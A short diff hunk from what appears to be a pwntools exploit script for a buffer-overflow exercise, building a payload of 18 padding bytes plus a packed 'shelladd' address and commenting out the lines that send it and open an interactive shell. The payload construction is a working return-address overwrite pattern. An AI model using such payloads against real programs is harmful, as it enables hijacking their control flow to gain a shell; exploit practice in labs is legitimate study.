@@ -12,6 +12,6 @@ offset = 18
 
 payload = flat(['a'*offset,p64(shelladd)])
 
-p.sendline(payload)
+# p.sendline(payload)
 
-p.interactive()
+# p.interactive()
